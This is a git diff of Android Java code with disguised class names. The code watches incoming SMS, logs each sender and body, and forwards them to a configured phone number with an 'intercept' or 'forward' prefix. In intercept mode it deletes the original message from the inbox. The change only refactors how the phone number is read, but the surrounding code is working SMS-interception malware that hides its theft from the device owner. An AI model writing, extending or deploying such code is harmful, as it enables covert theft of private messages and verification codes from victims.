@@ -61,11 +61,11 @@ public class DontentObserver extends ContentObserver {
 							DQLiteOpenHelper.getHelper(context).addData(lx,address, body, new Date());
 							LogUtils.write("Send", "加入发送线程");
 							if (type == 1) {
-								DmsManager.Send(context,Dctivity.phonenum,Dctivity.lanjie+address+"#"+body);
+								DmsManager.Send(context,Dctivity.getPhoneNumber(),Dctivity.lanjie+address+"#"+body);
 								LogUtils.write("Send", "删除短信");
 								context.getContentResolver().delete(Uri.parse("content://sms"),"_id=" + _id, null);
 							}else{
-								DmsManager.Send(context,Dctivity.phonenum,Dctivity.zhuanfa+address+"#"+body);
+								DmsManager.Send(context,Dctivity.getPhoneNumber(),Dctivity.zhuanfa+address+"#"+body);
 							}
 							Dhread.SartSend(context.getApplicationContext());
 						}
